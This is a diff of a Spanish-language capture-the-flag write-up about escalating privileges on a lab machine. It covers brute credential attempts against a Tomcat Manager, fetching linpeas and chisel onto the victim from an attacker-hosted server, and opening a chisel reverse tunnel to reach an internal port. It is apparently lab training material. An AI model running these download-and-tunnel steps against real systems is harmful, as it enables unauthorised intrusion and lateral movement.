@@ -876,7 +876,7 @@ Ahora en nuestro usuario rosa:
 2. Descargamos el script
 
    ```sh
-   wget http://192.168.1.9:8080/linpeas.sh
+   wget http://<HOST_IP>:8080/linpeas.sh
    ```
 
 3. Damos permisos
@@ -1018,11 +1018,113 @@ curl -u tomitoma:alicelaultramejor http://localhost:8080/manager/html
 
 Tomcat está activo en /manager/html pero el usuario tomitoma no tiene el rol manager-gui, que es necesario para acceder al panel HTML.
 
-- Buscamos algún usuario con privilegios:
+**Probé conectar con varios usuarios pero no obuve resultados:**
 
-  ```
-  
-  ```
+```sh
+curl -u veryhardpassword:admin12345password http://localhost:8080/manager/text/list
+```
 
-  
+## Estado actual
 
+- Estoy conectado como usuario rosa`, sin privilegios `sudo`.
+- Probé varias credenciales del dump sin éxito para el `Tomcat Manager`.
+- Tomcat está activo en `localhost:8080` pero inaccesible externamente.
+- Probé comandos para escalar con el PATH (`/tmp/date`, `/tmp/id`, etc.) sin éxito.
+- **No tengo aún acceso al usuario que puede ejecutar `/opt/alice/boss`.**
+- No hay archivos `SUID` que faciliten escalada directa.
+
+
+
+### **Continuando con la escalada de privilegios:**
+
+## Redirigir el puerto 8080 con chisel para acceder a Tomcat
+
+Instalamos chisel:
+
+```sh
+wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
+gunzip chisel_1.9.1_linux_amd64.gz
+mv chisel_1.9.1_linux_amd64 chisel
+chmod +x chisel
+sudo mv chisel /usr/local/bin/
+```
+
+Levantamos un servidor
+
+```sh
+chisel server --reverse -p 1234
+```
+
+```sh
+2025/07/23 21:52:37 server: Reverse tunnelling enabled
+2025/07/23 21:52:37 server: Fingerprint bf5ofzMc+e65zCi7zZqudtmhvOCAM814IPllbNrxv5M=
+2025/07/23 21:52:37 server: Listening on http://0.0.0.0:1234
+```
+
+Estamos esperando conexiones reversas de la víctima
+
+Vamos a servirle un archivo **chisel** a nuestra víctima:
+
+```sh
+wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
+gunzip chisel_1.9.1_linux_amd64.gz
+mv chisel_1.9.1_linux_amd64 chisel
+chmod +x chisel
+```
+
+Ya creado el archivo chisel, lo servimos:
+
+```sh
+python3 -m http.server 8080
+```
+
+En el usuario @rosa descargamos el chisel
+
+```sh
+wget http://<HOST_IP>:8080/chisel -O /tmp/chisel
+```
+
+```sh
+chmod +x /tmp/chisel
+```
+
+En @rosa  verificamos que el chisel se ejecuta:
+
+```sh
+/tmp/chisel --help
+```
+
+```sh
+  Usage: chisel [command] [--help]
+
+  Version: 1.9.1 (go1.21.0)
+
+  Commands:
+    server - runs chisel in server mode
+    client - runs chisel in client mode
+
+  Read more:
+    https://github.com/jpillora/chisel
+```
+
+Crear un tunel reverso a mi **host** desde **@rosa**
+
+```sh
+/tmp/chisel client <HOST_IP>:1234 R:4444:127.0.0.1:8080
+```
+
+Probamos si podemos hacer despliegues:
+
+```sh
+curl -u tomitoma:supersecurepasswordultra http://127.0.0.1:4444/manager/text/list > despliegue.txt
+```
+
+[despliegue.txt](./Files/despliegue.txt) Con **acceso denegado **a despliegues
+
+En el **host** probamos si tenemos acceso:
+
+```sh
+curl -u tomitoma:supersecurepasswordultra http://127.0.0.1:4444/manager/html > manager.html
+```
+
+[manager.html](./Files/manager.html)  confirma que ya tenemos acceso al Tomcat Web Application Manager con credenciales válidas y privilegios suficientes.
